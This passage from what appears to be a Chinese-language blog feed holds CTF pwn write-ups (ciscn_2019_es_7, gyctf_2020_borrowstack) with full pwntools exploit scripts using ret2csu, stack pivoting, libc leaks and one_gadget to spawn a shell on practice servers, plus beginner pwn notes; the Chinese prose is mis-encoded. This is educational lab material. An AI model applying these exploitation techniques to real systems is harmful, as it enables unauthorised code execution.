class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(sys_addr))</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh/x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr + <span class="number">8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(gadget2) + <span class="string">&#x27;/x00&#x27;</span> * <span class="number">0x38</span> + p64(main_addr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–é¢˜ç›®"><a href="#å…¶ä»–é¢˜ç›®" class="headerlink" title="å…¶ä»–é¢˜ç›®"></a>å…¶ä»–é¢˜ç›®</h3><h4 id="ciscn-2019-es-7ï¼ˆå…¶å®SROPï¼‰"><a href="#ciscn-2019-es-7ï¼ˆå…¶å®SROPï¼‰" class="headerlink" title="ciscn_2019_es_7ï¼ˆå…¶å®SROPï¼‰"></a>ciscn_2019_es_7ï¼ˆå…¶å®SROPï¼‰</h4><p>ï¼ˆ1ï¼‰checksec ï¼ˆåå­—å¤ªé•¿å°±ç»™æ”¹æˆaäº†wï¼‰</p><p>â€‹    <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729160314382.png" alt="image-20230729160314382"></p><p>ï¼ˆ2ï¼‰Good woman IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164657543.png" alt="image-20230729164657543"></p><p>  åç§»0x18<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164622920.png" alt="image-20230729164622920"></p><p>æŸ¥çœ‹vulnå‡½æ•°å‘ç°ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼šreadå’Œwrite ä»¥åŠsyscallå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164913572.png" alt="image-20230729164913572"></p><p>åŒæ—¶raxè¢«æ”¹æˆäº†0x3Bï¼Œå¯¹åº”è°ƒç”¨execveå‡½æ•°.</p><p>ä½¿ç”¨ROPgadgetæŸ¥çœ‹å¯åˆ©ç”¨çš„gadget.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729165814524.png" alt="image-20230729165814524"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªèƒ½å•ç‹¬æ§åˆ¶rdiï¼Œä¸èƒ½æ§åˆ¶rsiï¼Œrdxçš„å€¼.é‚£å°±ret2csuï¼ˆå½“ç„¶ä¸“é¢˜åºŸè¯hhï¼‰æ§åˆ¶rdxå’Œrsiå‚æ•°ï¼Œæœ€åæ‰§è¡Œmov raxï¼Œ0x3bï¼› syscallå³å¯.</p><p>so éš¾ç‚¹æ¥äº†ï¼šæ€ä¹ˆæŠŠå‚æ•°åœ°å€å­˜å…¥rdiï¼Ÿ<br>ç”±äºæˆ‘ä»¬æ§åˆ¶ä¸äº†raxçš„å€¼ï¼Œæ— æ³•ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å°†å…¶è®¾ç½®ä¸º0.bssæ®µå†™ä¸äº†ï¼Œåªèƒ½å†™å…¥ç¨‹åºç»™æˆ‘ä»¬çš„ç‰¹å®šä½ç½®æ¥äº†ï¼Œæ„å‘³ç€æˆ‘ä»¬éœ€è¦æ³„éœ²æ ˆä¸Šçš„åœ°å€.çœ‹çœ‹ç¨‹åºæ˜¯å¦ä¸ºæˆ‘ä»¬æä¾›äº†å¯ä»¥åˆ©ç”¨çš„ä»£ç .</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171034681.png" alt="image-20230729171034681"></p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º0x30</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171514964.png" alt="image-20230729171514964"></p><p>bufè·ç¦»æ ˆé¡¶åªæœ‰10å­—èŠ‚è·ç¦»ï¼Œå› æ­¤writeå‡½æ•°å¯ä»¥æ‰“å°å‡ºæ ˆä¸­å†…å®¹.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172115885.png" alt="image-20230729172115885"></p><p>æµ‹è¯•åªèƒ½æ˜¾ç¤º48å­—èŠ‚ gdbè°ƒå¼0x30åˆšåˆšå¥½ï¼ˆå…·ä½“ä¹‹åè¡¥å……ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172330284.png" alt="image-20230729172330284"></p><p>å…ˆå‘é€1ç„¶ågdbæŸ¥çœ‹<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729224838828.png" alt="image-20230729224838828"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729231040910.png" alt="image-20230729231040910"></p><p>æ³„éœ²çš„å†…å®¹æ˜¯çº¢çº¿çš„éƒ¨åˆ†ï¼ˆå½“ç„¶ç”±äºåªèƒ½æ³„éœ²0x30ä¸ªå­—èŠ‚ï¼Œæˆ‘çº¢çº¿åœˆå¤šäº†ï¼Œä½†æ˜¯æˆ‘æƒ³å¼ºè°ƒçš„æ˜¯æ ˆåœ°å€æ³„éœ²ï¼Œæ³„éœ²çš„æ˜¯å†…å®¹ï¼Œè€Œéæ ˆçš„åœ°å€ï¼‰</p><p>ä¸è¿‡æˆ‘ä»¬å‘ç°äº†ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ³„éœ²çš„æ ˆä¸­çš„å†…å®¹æ˜¯æŒ‡å‘äº†æ ˆçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨æ³„éœ²çš„æ ˆçš„å†…å®¹é…åˆåç§»ï¼Œæ¥è·å–æ ˆçš„åœ°å€äº†.</p><p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œvulå‡½æ•°çš„è¿”å›åœ°å€å°±æ˜¯æ­¤æ—¶æ ˆé¡¶çš„ï¼Œæˆ‘ä»¬æ˜¯è¦åŠ«æŒç¨‹åºçš„æ‰§è¡Œæµï¼Œå› æ­¤ç¬¬ä¸€ä¸ªåœ°å€è‚¯å®šæ˜¯æ²¡æ³•æ³„éœ²äº†ï¼Œæˆ‘ä»¬æ¥æ³„éœ²ç¬¬ä¸‰ä¸ªæ ˆçš„å†…å®¹ã€‚ç„¶åæŠŠè¿”å›åœ°å€å¡«å†™æˆvulå‡½æ•°çš„é¦–åœ°å€ï¼Œè®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡ï¼ˆå»è¿›è¡Œret2csuï¼‰</p><p>æ‹¿åˆ°æ ˆä¸­ç¬¬ä¸‰ä¸ªå†…å®¹åï¼Œçœ‹ä¸€ä¸‹å®ƒè·ç¦»æˆ‘ä»¬è¾“å…¥çš„å†…å®¹çš„é¦–åœ°å€åç§»æ˜¯å¤šå°‘.<br><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171939424-200600591.png" alt="img"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26250</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu_gadget1 = <span class="number">0x40059A</span></span><br><span class="line">modify_rax = <span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2 = <span class="number">0x400580</span></span><br><span class="line">term_proc = <span class="number">0x600e50</span><span class="comment">#pwndbg&gt;search -p åœ°å€ æŸ¥æ‰¾</span></span><br><span class="line">bss_addr = <span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">read_syscall = <span class="number">0x4004ED</span></span><br><span class="line">offset = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>, <span class="string">&#x27;\x00&#x27;</span>).encode() + p64(read_syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = leak_addr - <span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>, <span class="string">&#x27;\x00&#x27;</span>).encode() + p64(csu_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(term_proc)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_gadget2)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(modify_rax)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(bin_sh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>å…¶å®å¯ä»¥ç›´æ¥ret2libcï¼ˆğŸ¤¡ï¼‰w å­¦ä¹ è®°å½•äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25408</span>)</span><br><span class="line"></span><br><span class="line">bank=<span class="number">0x0601080</span></span><br><span class="line">leave=<span class="number">0x400699</span></span><br><span class="line">puts_plt=<span class="number">0x04004E0</span></span><br><span class="line">puts_got=<span class="number">0x0601018</span></span><br><span class="line">pop_rdi=<span class="number">0x400703</span></span><br><span class="line">main=<span class="number">0x0400626</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;u want&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bank)+p64(leave)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;now!&#x27;</span>)</span><br><span class="line">payload=p64(ret)*<span class="number">20</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(one_gadget)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>æ€è·¯ï¼š</strong>åˆ©ç”¨putså‡½æ•°æ³„éœ²libcå¾—åˆ° åœ¨bssæ®µä¸Šå†™å…¥åˆ©ç”¨ropå†™å…¥shellcode</p><p><strong>é—®é¢˜ï¼š</strong>bufåªæœ‰0x10å¤§å°ï¼Œå¦‚ä½•åœ¨bssæ®µé¡ºåˆ©å†™å…¥å‘¢ï¼Ÿ<br><strong>Answerï¼š</strong>bufåªèƒ½è¦†ç›–åˆ°retï¼Œä½†bankï¼ˆï¼‰åœ¨bssæ®µ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005633820.png"></p><p>åœ¨bufå¤„åˆ©ç”¨leaveæŒ‡ä»¤åŠ«æŒæ ˆè·³è½¬åˆ°bankå¤„ï¼Œå†™å…¥shellcode</p><p>ï¼ˆ1ï¼‰checksec</p><p>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731004821556.png" alt="image-20230731004821556"></p><p>ï¼ˆ2ï¼‰Lovely Woman  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005122883.png" alt="image-20230731005122883"></p><p>NXä¿æŠ¤æ‰“å¼€ï¼Œæ ˆä¸Šæ— systemï¼ˆï¼‰å’Œâ€&#x2F;bin&#x2F;shâ€ -&gt;libcæ³„éœ²</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005742112.png" alt="image-20230731005742112"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#callå‡½æ•°ä¸ºè·³è½¬åˆ°æŸåœ°å€å†…æ‰€ä¿å­˜çš„åœ°å€ï¼Œåº”è¯¥ä½¿ç”¨gotè¡¨ä¸­çš„åœ°å€</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span><span class="comment">#bank_addr</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#è¿™é‡Œå¤šåŠ 0x40çš„ç›®çš„å°±æ˜¯ä¸ºäº†æ‰§è¡Œputsçš„æ—¶å€™ï¼Œä¸å½±å“ä¹‹å‰çš„gotè¡¨ä¸­çš„æ•°æ®</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#è¿™ä¸€ä¸ª4006E0ä»…ä»…æ˜¯ret2csuæ‰§è¡Œäº†popä¹‹åçš„retçš„è¿”å›çš„åœ°å€ã€‚</span></span><br><span class="line"><span class="comment">#è‡³äºæ€ä¹ˆè¿”å›åˆ°one_gadgetä¸Šçš„ï¼Œæ˜¯å› ä¸ºreadçš„è¿”å›åœ°å€è¢«readè‡ªå·±ç»™æ”¹äº†</span></span><br><span class="line"><span class="comment">#payload2ä¸­çš„ç¬¬ä¸€ä¸ªp64(0)æ˜¯å»å ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ ˆè¿ç§»æœ¬èº«çš„ç‰¹æ€§ï¼Œè¿ç§»åçš„ç¬¬ä¸€ä¸ªå†…å­˜å•å…ƒä¸æ‰§è¡Œ</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #åªè¦æ˜¯å‘é€åœ°å€ å°±è¦ç»è¿‡æ‰“åŒ…ä¹‹åå‘é€</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>â—â—â—u1s1â—â—â—<br>ä¸ç®¡ç”¨å“ªä¸ªæ–¹æ³•ï¼Œéƒ½éœ€è¦è€ƒè™‘åˆ©ç”¨å‡½æ•°ï¼ˆbankï¼‰ä¸gotè¡¨é—´è·ç¦».åœ¨æ ˆè¿æ—¶éœ€è¦æŠŠåœ°å€ç›¸å¯¹æŠ¬é«˜äº›ï¼Œé˜²æ­¢ç ´ågotè¡¨.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731155611578.png" alt="image-20230731155611578"></p><p>ä¸‹é™„æ ˆè¿ç§»ç›¸å…³èµ„æ–™ï¼š</p><p>[]: <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">https://www.cnblogs.com/ZIKH26/articles/15817337.html</a></p><p><strong>tipsï¼š</strong>æ²¡æ³•æ³„éœ²libcæ—¶å¯ç”¨one_gadgetï¼Œåˆ©ç”¨åœ¨çº¿ç½‘ç«™</p><p>[]: <a href="https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64">https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64</a></p><p>å°†æ³„éœ²å‡½æ•°ï¼ˆæœ¬é¢˜ä¸ºputs å…¶ä»–å‡½æ•°æ˜¯å¦ç›¸åŒ æœ‰å¾…è€ƒç©¶ï¼‰çš„åä¸‰ä½ï¼Œæ‰¾åˆ°libcç‰ˆæœ¬</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>one_gadget libcç‰ˆæœ¬</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnæ¢ç´¢--å¤§æ‚çƒ©</title>
      <link href="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>pwnçš„æ ¸å¿ƒï¼šäºŒè¿›åˆ¶æ¼æ´çš„åˆ©ç”¨å’ŒæŒ–æ˜<br>ç ”ç©¶å±‚æ¬¡ï¼šç¼–è¯‘æˆæœºå™¨ç çš„äºŒè¿›åˆ¶ç¨‹åºçš„æ¼æ´äºŒè¿›åˆ¶ç¨‹åºå®é™…ä¸ºå¯æ‰§è¡Œæ–‡ä»¶<br>linuxç³»ç»Ÿä¸‹ELF&#x3D;windowsç³»ç»Ÿä¸‹EXEæ–‡ä»¶<br><strong>ä¸€æ¬¡ç®€å•çš„hack</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png" alt="image-20230307002535708"></p><p>CTFä¸­pwnæ”»å‡»è„šæœ¬æ€è·¯ï¼š</p><p>1.pwnç¨‹åº&#x2F;æœåŠ¡å™¨ï¼ˆå¿…ä¸å¯å°‘æ»´ï¼‰å¼€ç«¯â€”â€”&gt;from pwn import*<br>2.ä½¿ç”¨pythonä¸­pwn toolsç”¨remoteå‡½æ•°æ‰“å¼€è¿œç«¯éœ€è¦æ”»å‡»çš„æœåŠ¡å™¨ç«¯å£<br>3.è¿›è¡Œé“¾æ¥<br>4.æ„é€ æ¶æ„æ•°æ®<br>5.å‘é€æ¶æ„æ•°æ®<br>6.ä½¿ç”¨äº¤äº’å‡½æ•°ï¼ˆio.interactiveï¼ˆï¼‰ï¼‰è·å–flag</p><h5 id="ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥"><a href="#ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥" class="headerlink" title="ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥"></a><strong>ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206225702913.png" alt="image-20230206225702913"></p><p>linuxå€ŸåŠ©æ–‡ä»¶å¤´è¿›è¡Œè¯†åˆ«!ï¼ˆç”¨vimæ‰“å¼€å¯æŸ¥çœ‹æºç â€“&gt;%!xxdå¯æŸ¥çœ‹åå…­è¿›åˆ¶è¡¨ç¤ºï¼‰<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206230237084.png" alt="image-20230206230237084"></p><h5 id="ç¼–è¯‘è¿‡ç¨‹"><a href="#ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘è¿‡ç¨‹"></a><strong>ç¼–è¯‘è¿‡ç¨‹</strong></h5><p>lsæŒ‡list fileå³åˆ—å‡ºæ–‡ä»¶ï¼›å¯ç”¨llæŸ¥çœ‹æ–‡ä»¶è¯¦ç»†å†…å®¹ã€‚<br>gccå…¼å…·ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨çš„åŠŸèƒ½ã€‚<br>ctrl+alt+t å¯åŠ¨shell</p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206231832031.png" alt="image-20230206231832031" style="zoom:150%;" /><p>Linuxç¯å¢ƒä¸‹æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶<br>!xdd%-r è¿˜åŸæ–‡ä»¶<br>rm a.out åˆ é™¤<br>.&#x2F;a.out æ˜¯linux&#x2F;unixç¯å¢ƒä¸‹gccç¼–è¯‘æºä»£ç (c&#x2F;c++)å¹¶è¿æ¥æ¥äº§ç”Ÿçš„é»˜è®¤æ‰§è¡Œæ–‡ä»¶åã€‚.&#x2F;a.outè¡¨ç¤ºå½“å‰ç›®å½•ä¸‹çš„a.outæ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206232441503.png" alt="image-20230206232441503"></p><p>é“¾æ¥<br>åŠ¨æ€é“¾æ¥ï¼šprintfçš„ä»£ç åˆ°åŠ¨æ€é“¾æ¥åº“é‡Œï¼›<br>é™æ€é“¾æ¥ï¼šprintfä¸­çš„ä»£ç ç›´æ¥å†™å¥½åœ¨å¯¹åº”æ–‡ä»¶ä¸­<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206235815274.png" alt="image-20230206235815274"><br><strong>æ–‡ä»¶æƒé™ä¸å¤Ÿæ—¶å¦‚ä½•å¤„ç†å¾—åˆ°shell</strong><br>ä¸‹ä»¥python3ä¸ºä¾‹</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208112405419.png" alt="image-20230208112405419"></p><p>mvå‘½ä»¤ï¼šç”¨æˆ·å¯ä»¥ä½¿ç”¨mvå‘½ä»¤æ¥ä¸ºæ–‡ä»¶æˆ–ç›®å½•æ”¹åæˆ–å°†æ–‡ä»¶ç”±ä¸€ä¸ªç›®å½•ç§»å…¥å¦ä¸€ä¸ªç›®å½•ä¸­ã€‚<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208141609541.png" alt="image-20230208141609541"></p><p>æ®µç”¨æ¥æ ‡æ³¨è¿›ç¨‹ã€å°è±¡ä»£ç æ®µæƒé™ã€‚<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208142032344.png" alt="image-20230208142032344"></p><p>.&#x2F;æ—¶æ‰è¢«è¯»å…¥å†…å­˜<br>cacheè¶Šå¤§ï¼ˆMå­˜å‚¨ï¼‰ï¼Œcpué€Ÿåº¦è¶Šå¿«ã€‚</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208151435139.png" alt="image-20230208151435139"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208152953051.png" alt="image-20230208152953051"></p><p>å®æ¨¡å¼ä¸‹è¿è¡Œï¼ˆæ˜“å—åˆ°æ”»å‡»ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161344724.png" alt="image-20230208161344724"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161302543.png" alt="image-20230208161302543"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162239886.png" alt="image-20230208162239886"></p><p>åå…­è¿›åˆ¶è½¬äºŒè¿›åˆ¶</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162610999.png" alt="image-20230208162610999"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164349628.png" alt="image-20230208164349628"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164650781.png" alt="image-20230208164650781"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170556987.png" alt="image-20230208170556987"></p><p><img 